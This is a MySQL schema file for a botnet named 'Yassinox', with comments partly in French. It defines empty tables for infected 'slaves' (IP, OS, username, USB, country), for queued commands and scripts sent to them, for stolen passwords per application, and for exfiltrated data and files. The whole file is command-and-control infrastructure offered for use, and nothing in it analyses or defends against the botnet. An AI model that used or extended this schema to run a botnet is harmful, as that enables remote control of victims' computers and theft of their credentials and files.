-- 
-- YASSINOX BOTNET MYSQL DATABSE FILE
-- 

SET SQL_MODE="NO_AUTO_VALUE_ON_ZERO";

-- 
-- Base de donn�es: `y_botnet`
-- 

-- --------------------------------------------------------

-- 
-- Structure de la table `chat`
-- 

CREATE TABLE `chat` (
  `slave_id` varchar(1000) NOT NULL,
  `text` varchar(10000) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- 
-- Contenu de la table `chat`
-- 


-- --------------------------------------------------------

-- 
-- Structure de la table `commands`
-- 

CREATE TABLE `commands` (
  `slave_id` varchar(1000) NOT NULL,
  `command` varchar(1000) NOT NULL,
  `status` varchar(1000) NOT NULL,
  `content` varchar(1000) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- 
-- Contenu de la table `commands`
-- 


-- --------------------------------------------------------

-- 
-- Structure de la table `content`
-- 

CREATE TABLE `content` (
  `content` varchar(1000) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- 
-- Contenu de la table `content`
-- 


-- --------------------------------------------------------

-- 
-- Structure de la table `data`
-- 

CREATE TABLE `data` (
  `slave_id` varchar(1000) NOT NULL,
  `text` varchar(10000) NOT NULL,
  `file` varchar(1000) NOT NULL,
  `type` varchar(5000) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- 
-- Contenu de la table `data`
-- 


-- --------------------------------------------------------

-- 
-- Structure de la table `passwords`
-- 

CREATE TABLE `passwords` (
  `slave_id` varchar(1000) NOT NULL,
  `username` varchar(1000) NOT NULL,
  `password` varchar(1000) NOT NULL,
  `application` varchar(1000) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- 
-- Contenu de la table `passwords`
-- 


-- --------------------------------------------------------

-- 
-- Structure de la table `scripting`
-- 

CREATE TABLE `scripting` (
  `slave_id` varchar(1000) NOT NULL,
  `type` varchar(1000) NOT NULL,
  `script` varchar(10000) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- 
-- Contenu de la table `scripting`
-- 


-- --------------------------------------------------------

-- 
-- Structure de la table `slaves`
-- 

CREATE TABLE `slaves` (
  `id` varchar(1000) NOT NULL,
  `ip` varchar(1000) NOT NULL,
  `os` varchar(1000) NOT NULL,
  `date` date NOT NULL,
  `username` varchar(1000) NOT NULL,
  `usb` varchar(1000) NOT NULL,
  `command` varchar(1000) NOT NULL,
  `country` varchar(1000) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- 
-- Contenu de la table `slaves`
-- 

